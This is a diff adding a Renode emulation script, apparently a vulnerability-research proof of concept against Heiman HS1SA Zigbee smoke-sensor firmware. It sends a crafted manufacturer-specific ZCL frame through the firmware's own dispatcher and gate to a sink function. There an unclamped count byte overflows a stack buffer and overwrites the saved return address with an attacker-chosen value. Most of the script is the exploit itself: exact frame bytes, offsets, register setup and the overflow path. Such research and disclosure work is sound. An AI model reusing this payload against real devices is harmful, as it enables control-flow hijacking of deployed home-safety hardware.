@@ -1,0 +1,118 @@
+:name: ZB-06 HS1SA — ZCL-DISPATCH-INJECTION reachability PoC (SOURCE-side of dispatch -> SINK)
+:description: Injects an ALREADY-DECRYPTED PLAINTEXT manufacturer-specific ZCL frame at the firmware's ZCL command dispatcher sub_7D46 and lets the Heiman HS1SA firmware's OWN code parse it, classify it, route it through the gate sub_a33c, and reach the vulnerable sink sub_1662e. No PC is forced into the parser, the gate, or the sink: only the dispatcher ENTRY is entered with the plaintext frame + the register contract sub_C22C/sub_E376 would have set up. This closes two axes the earlier function-level PoC skipped: (1) GATE REACHABILITY (the firmware's own dispatch routes mfgCode-0x120B/cmdId-0xF3 to the sink) and (2) PARAMETER FIDELITY (the attacker count byte flows UNCLAMPED to the OOB write).
+#
+# ============================ RESULT (reproduced 2026-07-13) ============================
+#   Marker order (all NATURAL, fired by the firmware's own branches/calls):
+#       MARK_7D46_ZCLDISP -> MARK_7B5A -> MARK_A33C_GATE -> MARK_1662E_SINK
+#   saved-LR slot @0x2000FFB4:  0xAABBCCDD  (sentinel, before)
+#                            -> 0x20006E01  (attacker-chosen, after; from payload records 34/35)
+#   => The firmware's OWN dispatch routed the injected frame to the sink and the
+#      unclamped count byte (payload[0x0a]=0x28=40) overflowed the 16-word stack
+#      buffer, overwriting the sink's saved return address via the natural path.
+#
+# ============================ FORCED vs NATURAL ============================
+#   FORCED (emulation scaffolding, minimal):
+#     * The plaintext frame is written into scratch RAM and the CPU is entered at
+#       sub_7D46 (0x7D46) with r0/r1/r2/r3 + stack args exactly as sub_C22C/sub_E376
+#       would pass them. This deliberately BYPASSES NWK/APS decryption, APS
+#       addressing, and the APS endpoint/cluster affinity search (see below). It
+#       proves "a frame that reaches ZCL command dispatch IS routed to the sink
+#       with attacker-controlled params", NOT the full crypto-authenticated OTA path.
+#   NATURAL (firmware's own execution, from sub_7D46 down — NO forced PC):
+#     * sub_7cc0 (called by sub_7D46) parses the ZCL header from our bytes:
+#       FC bit2 => manufacturer-specific, mfgCode = frame[1..2] = 0x120B,
+#       TSN = frame[3], cmdId = frame[4] = 0xF3.
+#     * sub_7B5A reads the parsed struct (struct[0x10]=mfgCode, struct[0x13]=cmdId,
+#       direction = [struct[0]+2]) and CALLS the gate sub_a33c.
+#     * sub_a33c matches (mfgCode==0x120B && dir==0 && cmdId==0xF3) and TAIL-CALLS
+#       the sink sub_1662e(r0=payload_ptr=frame+5, r1=remaining_len=len-5).
+#     * sub_1662e uses payload[0x0a] as an UNCLAMPED loop bound and writes halfword
+#       records into a 32-byte stack buffer at SP+0x18; index 34 lands on the saved
+#       LR (SP+0x5c), so count>=36 overwrites the return address.
+#
+# ============================ WHY NOT ENTER AT sub_E376 ============================
+#   sub_E376 (the APS-layer plaintext parser) was probed as the preferred entry.
+#   With a crafted 0xC801-addressing frame it passes EVERY field check in order:
+#     0xe3ae C801 branch -> 0xe3e6 len>6 -> 0xe3f2 frame[0x11..12]==0xB
+#     -> 0xe402 (frame[0x13]&~0x2C)==3 -> 0xe414 (frame[0x13]&0xC)==0xC
+#     -> 0xe458 ZCL-offset computed -> 0xe466 -> 0xe478 endpoint-table search.
+#   It then RETURNS at 0xe592 WITHOUT calling sub_7D46 (0xe58e): the endpoint/cluster
+#   affinity table search loop (0xe4c6-0xe502, table via literal @0xe684) finds NO
+#   matching entry for our frame, so E376 yields r0=0 (undispatched). Satisfying that
+#   search requires the frame's APS cluster/profile/endpoint (frame[0x14..0x19]) to
+#   match a registered endpoint - an APS/endpoint-routing precondition ABOVE the ZCL
+#   command dispatch, which is exactly the layer this PoC is chartered to bypass.
+#   Hence we inject one layer lower, at the ZCL command dispatcher sub_7D46, which is
+#   where mfgCode/cmdId classification and the vulnerable gate actually live.
+# =======================================================================================
+
+include @scripts/silabs-vuln/hs1sa.resc
+logLevel 3
+logLevel 3 sysbus.radio
+
+# COLD hooks (each address executes once on this path -> no flooding).
+cpu AddHook 0x7d46  "self.ErrorLog('MARK_7D46_ZCLDISP')"
+cpu AddHook 0x7b5a  "self.ErrorLog('MARK_7B5A')"
+cpu AddHook 0xa33c  "self.ErrorLog('MARK_A33C_GATE')"
+cpu AddHook 0x1662e "self.ErrorLog('MARK_1662E_SINK')"
+
+# Boot through clock/power/radio bring-up (verify PC advances, not stuck @0x266A4).
+emulation RunFor "0.05"
+pause
+echo ">>> post-boot PC (expect advanced, e.g. ~0x12e10):"
+cpu PC
+
+# --- Craft the PLAINTEXT manufacturer-specific ZCL frame in scratch RAM ---------------
+# Zero the frame + payload region first.
+python "for a in range(0x20008000,0x200080A0,4): monitor.Machine.SystemBus.WriteDoubleWord(a,0)"
+# APS-header stand-in for r0: sub_7B5A reads [r0+2]==0 (direction) and [r0+5].
+python "monitor.Machine.SystemBus.WriteDoubleWord(0x20009000,0)"
+python "monitor.Machine.SystemBus.WriteDoubleWord(0x20009004,0)"
+
+# ZCL frame @0x20008003 (frame_ptr = r2):
+#   [0]=FC=0x05  (bit2=manufacturer-specific, bit0 set)
+#   [1..2]=mfgCode 0x120B (LE)   [3]=TSN=0x00   [4]=cmdId=0xF3
+sysbus WriteByte 0x20008003 0x05
+sysbus WriteDoubleWord 0x20008004 0xF300120B
+# Sink command body (payload_ptr = frame+5 = 0x20008008), byte layout copied verbatim
+# from the function-level PoC zb06_validate.resc:
+#   payload[0x08]=0x01 (outer segment count <5)   payload[0x0a]=0x28=40 (UNCLAMPED count)
+#   records 34/35 carry the saved-LR sentinel target 0x20006E01
+sysbus WriteDoubleWord 0x20008010 0x41280001
+sysbus WriteDoubleWord 0x20008054 0x6E414141
+sysbus WriteDoubleWord 0x20008058 0x41002001
+
+# sub_7D46 incoming stack args (read at [sp+0x30]/[sp+0x34], above SP) -> zero them.
+sysbus WriteDoubleWord 0x20010030 0x00000000
+sysbus WriteDoubleWord 0x20010034 0x00000000
+
+# Pre-place a saved-LR sentinel where the SINK's saved LR will land.
+# With entry SP=0x20010000: 7D46 push(48) + 7B5A push(24) => sink entry SP S=0x2000FFB8;
+# sink saves LR at S-4 and buffer[34] (index 34 of SP+0x18 array) writes the same slot.
+sysbus WriteDoubleWord 0x2000FFB4 0xAABBCCDD
+echo ">>> BEFORE: saved-LR slot @0x2000FFB4 (sentinel) ="
+sysbus ReadDoubleWord 0x2000FFB4
+
+# --- Register contract sub_C22C/sub_E376 would hand sub_7D46 -------------------------
+#   r0 = APS-header stand-in ([+2]=0 => direction 0)
+#   r2 = ZCL frame ptr        r3 = frame length
+#   SP = fresh scratch stack  LR = 0xDEAD sentinel (return would fault; irrelevant)
+sysbus.cpu SetRegister 0  0x20009000
+sysbus.cpu SetRegister 1  0x00000000
+sysbus.cpu SetRegister 2  0x20008003
+sysbus.cpu SetRegister 3  0x00000060
+sysbus.cpu SetRegister 13 0x20010000
+sysbus.cpu SetRegister 14 0x0000DEAD
+sysbus.cpu PC 0x7d46
+
+# Let the firmware's OWN dispatch carry the frame down (few hundred instructions to
+# the sink; the sink's per-record loop keeps running, so use a bounded window).
+emulation RunFor "0.001"
+pause
+
+echo ">>> AFTER: PC ="
+cpu PC
+echo ">>> AFTER: saved-LR slot @0x2000FFB4 (expect 0x20006E01) ="
+sysbus ReadDoubleWord 0x2000FFB4
+echo ">>> (see MARK_* above: 7D46 -> 7B5A -> A33C_GATE -> 1662E_SINK = full natural dispatch)"
+quit
